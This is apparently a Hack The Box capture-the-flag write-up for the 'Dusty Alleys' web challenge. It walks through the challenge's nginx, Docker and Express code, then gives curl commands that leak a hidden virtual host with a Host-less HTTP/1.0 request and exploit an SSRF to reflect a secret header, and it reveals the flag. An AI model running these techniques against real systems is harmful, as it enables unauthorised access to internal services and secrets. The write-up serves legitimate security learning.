---
title: Dusty Alley Writeup 
date: 2025-11-11 18:00 +0100
categories: [Pentesting, Hack The Box, WEB]
tags: [web, pentest,HTB,writeup, cheat-sheet]
author: F1Z3R
---

# Dusty Alleys

### **Challenge Description**

In the dark, dusty underground labyrinth, the survivors feel lost, and their resolve weakens. As despair sets in, they notice a faint light: a dilapidated, rusty robot emitting feeble sparks. Hoping for answers, they decide to engage with it.

## Analysis and exploitation

The directory structure of the challenge is :

```
├── build-docker.sh
├── challenge
│   ├── index.js
│   ├── package.json
│   ├── package-lock.json
│   ├── public
│   │   └── guardian.jpg
│   ├── routes
│   │   └── guardian.js
│   └── views
│       ├── guardian.ejs
│       └── index.ejs
├── config
│   ├── default.conf
│   ├── evil-robot.jpg
│   └── index.html
└── Dockerfile
```

The most valuable file are : routes/guardian.js and config/default.conf and Dockerfile .

### Dockerfile :

```bash
FROM node@sha256:b375b98d1dcd56f5783efdd80a4d6ff5a0d6f3ce7921ec99c17851db6cba2a93

RUN apk update && apk add nginx
ENV SECRET_ALLEY=REDACTED

COPY config/default.conf /etc/nginx/http.d/

WORKDIR /app
COPY ./challenge/package.json ./package.json
RUN npm install
COPY challenge/index.js ./index.js
COPY ./challenge/public ./public
COPY ./challenge/routes ./routes
COPY ./challenge/views ./views
RUN sed -i "s/\$SECRET_ALLEY/$SECRET_ALLEY/g" /etc/nginx/http.d/default.conf
COPY ./config/index.html /var/www/html/index.html
COPY ./config/evil-robot.jpg /var/www/html/evil-robot.jpg

EXPOSE 80
ENV FLAG=HTB{REDACTED}

CMD nginx && node index.js

```

The dockerfile mentioned a very importante thing in the challenge which is the SECRET_ALLEY and the flag is stored in the FLAG environment variable .

### default.conf

```bash
server {
        listen 80 default_server;
        server_name alley.$SECRET_ALLEY;

    location / {
        root /var/www/html/;  
        index index.html;              
    }

        location /alley {
                        proxy_pass http://localhost:1337;
                        proxy_set_header Host $host;
                        proxy_set_header X-Real-IP $remote_addr;
                        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
                        proxy_set_header X-Forwarded-Proto $scheme;
        }

        location /think  { 
                        proxy_pass http://localhost:1337;
                        proxy_set_header Host $host;
                        proxy_set_header X-Real-IP $remote_addr;
                        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
                        proxy_set_header X-Forwarded-Proto $scheme;

                        }
}

server {
        listen 80;
                server_name guardian.$SECRET_ALLEY;

        location /guardian {
                        proxy_pass http://localhost:1337;
                        proxy_set_header Host $host;
                        proxy_set_header X-Real-IP $remote_addr;
                        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
                        proxy_set_header X-Forwarded-Proto $scheme;
        }
}
```

The Nginx configuration file defines two server blocks:

- **alley.$SECRET_ALLEY** (default server): Requests to `/`serve static files (e.g., index.html) from /var/www/html/ and requests to `/alley` and `/think` are proxied to http://localhost:1337
- **guardian.$SECRET_ALLEY**: Requests to `/guardian` are also proxied to http://localhost:1337

### Guardian.jsx

```bash
const node_fetch = require("node-fetch");
const router = require("express").Router();

router.get("/alley", async (_, res) => {
  res.render("index");
});

router.get("/think", async (req, res) => {
  return res.json(req.headers);
});

router.get("/guardian", async (req, res) => {
  const quote = req.query.quote;

  if (!quote) return res.render("guardian");

  try {
    const location = new URL(quote);
    const direction = location.hostname;
    if (!direction.endsWith("localhost") && direction !== "localhost")
      return res.send("guardian", {
        error: "You are forbidden from talking with me.",
      });
  } catch (error) {
    return res.render("guardian", { error: "My brain circuits are mad." });
  }

  try {
    let result = await node_fetch(quote, {
      method: "GET",
      headers: { Key: process.env.FLAG || "HTB{REDACTED}" },
    }).then((res) => res.text());

    res.set("Content-Type", "text/plain");

    res.send(result);
  } catch (e) {
    console.error(e);
    return res.render("guardian", {
      error: "The words are lost in my circuits",
    });
  }
});

module.exports = router;
```

The `guardian.js` file defines the following routes for Node.js application:

- `/alley`: Renders the `index.ejs` file.
- `/think`: Returns all request headers in JSON format.
- `/guardian`: Process a `quote` parameter and constructs a URL from its value. Validates the URL’s hostname (it only accepts requests if the hostname is localhost or ends with localhost. If the URL is valid, performs an HTTP GET request to the constructed URL using `node-fetch`, with a `key` header set to the value of `process.env.FLAG`

### Based on the initial analysis, the following points were established:

- Two virtual hosts, `alley.$SECRET_ALLEY` and `guardian.$SECRET_ALLEY`, are configured in Nginx. The value of `$SECRET_ALLEY` is unknown, preventing direct external access.
- The `/guardian` route is vulnerable to Server-Side Request Forgery (SSRF), as it fetches a user-supplied URL from the `quote` parameter.
- The `/think` endpoint returns all request headers in JSON format, which can be exploited to leak sensitive information.

**Step 1: Leaking the SECRET_ALLEY Value**

Since the `Host` header is optional in HTTP/1.0, sending a request without it causes Nginx to route to the default virtual host, `alley.$SECRET_ALLEY`. By querying the `/think` endpoint without a `Host` header, the server's default hostname is revealed in the response.

```
curl -H "Host:" --http1.0 http://<IP:PORT>/think
```

**Response:**

```
{"host":"alley.firstalleyontheleft.com", ... }
```

From this, the full virtual hostname is disclosed: `alley.firstalleyontheleft.com`, meaning `$SECRET_ALLEY` is `firstalleyontheleft.com`.

**Step 2: Exploiting SSRF to Leak the Flag**

The `/guardian` route on the `guardian.$SECRET_ALLEY` vhost includes an internal `Key` header, set to the value of `process.env.FLAG`, when making its backend request. Using the SSRF vulnerability, a request can be crafted to the internal `http://localhost:1337/think` endpoint. The `/think` endpoint will then reflect the `Key` header in its response, exposing the flag.

```
curl -H "Host: guardian.firstalleyontheleft.com" "http://<IP:PORT>/guardian?quote=http://localhost:1337/think"
```

**Response:**

```
{"key":"HTB{DUsT_1n_my_3y3s_l33t}","accept":"*/*","user-agent":"node-fetch/1.0 (+https://github.com/bitinn/node-fetch)","accept-encoding":"gzip,deflate","connection":"close","host":"localhost:1337"}
```